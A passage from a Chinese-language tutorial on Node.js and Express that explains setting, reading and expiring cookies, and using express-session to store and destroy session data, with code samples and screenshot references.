res<span class="token punctuation">.</span><span class="token keyword">set</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'set-cookie'</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token string">'goodsName=xiaomi 6;expires='</span> <span class="token operator">+</span> expiresTime<span class="token punctuation">,</span> <span class="token string">'goodsPrice=3999'</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
</code></pre></div><ol><li>使用 setHeader 设置cookie</li></ol> <p><img src="/assets/img/1550715805092-1553325280403.ede95b4d.png" alt="1550715805092"></p> <p>打开浏览器运行</p> <p><img src="/assets/img/1550715695394-1553325297231.79559769.png" alt="1550715695394"></p> <p><img src="/assets/img/1550715834037-1553325311016.427a3e82.png" alt="1550715834037"></p> <p><img src="/assets/img/1550715854650-1553325326587.95849431.png" alt="1550715854650"></p> <p><img src="/assets/img/1550715877585-1553325343238.d128367a.png" alt="1550715877585"></p> <p>注意: 使用 setHeader 设置cookie时，只能使用一次，如果反复使用，后面会覆盖前面。</p> <ol start="2"><li>一次性设置多个cookie</li></ol> <p><img src="/assets/img/1550715998056-1553325358646.2a06e0b3.png" alt="1550715998056"></p> <p><img src="/assets/img/1550716026560-1553325371829.85658e20.png" alt="1550716026560"></p> <ol start="3"><li>使用 writeHeader 来设置cookie</li></ol> <p><img src="/assets/img/1550717040205-1553325385819.a12958fa.png" alt="1550717040205"></p> <h3 id="读取cookie"><a href="#读取cookie" aria-hidden="true" class="header-anchor">#</a> 读取cookie</h3> <p>当网站已经给浏览器设置好cookie之后，浏览器再次请求网站的路由时，就会将cookie信息随请求头一起发送给服务器</p> <p><img src="/assets/img/1550717326882-1553325399932.8badb883.png" alt="1550717326882"></p> <p>核心： req.headers.cookie 中</p> <p><img src="/assets/img/1550717525173-1553325412893.85b15b8d.png" alt="1550717525173"></p> <p>所以： req.headers.cookie = 'id=10; name=ls; goodsName=xiaomi 6; goodsPrice=3999'</p> <p>目标:</p> <p>'id=10; name=ls; goodsName=xiaomi 6; goodsPrice=3999' 转为对象形式</p> <p>{id:10, name:&quot;ls&quot;, goodsName:&quot;xiaomi 6&quot;; goodsPrice:3999}</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">//node提供了系统模块 querystring 能够帮助我们将cookie字符串拆分为对象</span>
<span class="token keyword">const</span> qs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'querystring'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> obj <span class="token operator">=</span> qs<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span><span class="token string">'id=10001;name=zs'</span><span class="token punctuation">,</span> <span class="token string">';'</span><span class="token punctuation">,</span> <span class="token string">'='</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// {id:10001, name:&quot;zs&quot;}</span>
</code></pre></div><p>req.url     req.method     req.headers</p> <p><img src="/assets/img/1550718010509-1553325425301.e9d33c80.png" alt="1550718010509"></p> <h3 id="cookie有效期"><a href="#cookie有效期" aria-hidden="true" class="header-anchor">#</a> cookie有效期</h3> <ul><li>设置了expires则有效期到expires指定的时间</li> <li>未设置expires则关闭浏览器cookie即消失</li></ul> <p><img src="/assets/img/1550718521440-1553325438148.031a7ead.png" alt="1550718521440"></p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">//一天</span>
<span class="token keyword">new</span> <span class="token class-name">Date</span>（Date<span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">3600000</span> <span class="token operator">*</span> <span class="token number">24</span>）<span class="token punctuation">;</span>

<span class="token comment">//一周</span>
<span class="token keyword">new</span> <span class="token class-name">Date</span>（Date<span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">3600000</span> <span class="token operator">*</span> <span class="token number">24</span> <span class="token operator">*</span> <span class="token number">7</span>）<span class="token punctuation">;</span>
</code></pre></div><h2 id="session"><a href="#session" aria-hidden="true" class="header-anchor">#</a> Session</h2> <h3 id="session介绍"><a href="#session介绍" aria-hidden="true" class="header-anchor">#</a> session介绍</h3> <ul><li>因为cookie是保存在客户端的数据，不够安全，所以出现了session。</li> <li>session会将数据保存到服务器端（保存在文件、内存服务器或数据表中），安全性就可以得到保证。</li></ul> <h3 id="设置-读取session"><a href="#设置-读取session" aria-hidden="true" class="header-anchor">#</a> 设置/读取session</h3> <p>express设置session时，需要使用第三方模块 --- express-session</p> <div class="language-shell extra-class"><pre class="language-shell"><code><span class="token function">npm</span> i express-session
</code></pre></div><p>使用步骤：</p> <ol><li><p>加载 express-session 模块</p></li> <li><p>将session注册为中间件</p></li> <li><p>使用req.session对象设置/读取session</p></li></ol> <div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">//1. 加载 express-session 模块</span>
<span class="token keyword">const</span> session <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express-session'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//2. 配置项</span>
<span class="token keyword">const</span> obj <span class="token operator">=</span> <span class="token punctuation">{</span>
    secret<span class="token punctuation">:</span> <span class="token string">'4ey32erfyf3fgpg'</span><span class="token punctuation">,</span>   <span class="token comment">//加密字符串。 使用该字符串来加密session数据，自定义</span>
    resave<span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>               <span class="token comment">//强制保存session即使它并没有变化</span>
    saveUninitialized<span class="token punctuation">:</span> <span class="token boolean">false</span>     <span class="token comment">//强制将未初始化的session存储。当新建了一个session且未</span>
    							 <span class="token comment">//设定属性或值时，它就处于未初始化状态。</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token comment">//3. 注册为express-session中间件</span>
app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token function">session</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">//4. 使用 req.session.属性 = 值  方式来设置session</span>
app<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'/sets'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>isLogin <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
    req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>userInfo <span class="token operator">=</span> <span class="token punctuation">{</span>user_id<span class="token punctuation">:</span><span class="token number">10001</span><span class="token punctuation">,</span> user_name<span class="token punctuation">:</span><span class="token string">&quot;zs&quot;</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
    <span class="token comment">//注意：一定要将数据发回给浏览器，否则session无法生效</span>
    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'设置session'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">//设置好之后，req.session中的结构</span>
req<span class="token punctuation">.</span>session <span class="token operator">=</span> <span class="token punctuation">{</span>
    isLogin<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
    userInfo<span class="token punctuation">:</span> <span class="token punctuation">{</span>user_id<span class="token punctuation">:</span><span class="token number">10001</span><span class="token punctuation">,</span> user_name<span class="token punctuation">:</span><span class="token string">&quot;zs&quot;</span><span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre></div><h3 id="session有效期"><a href="#session有效期" aria-hidden="true" class="header-anchor">#</a> session有效期</h3> <ul><li>当浏览器关闭后，session消失</li> <li>express-session会将session保存在内存中，每次重启服务器时即使没有关闭浏览器session也会消失</li></ul> <h3 id="删除session"><a href="#删除session" aria-hidden="true" class="header-anchor">#</a> 删除session</h3> <p>核心： req.session.destroy()    销毁所有session</p> <p><img src="data:image/png;base64,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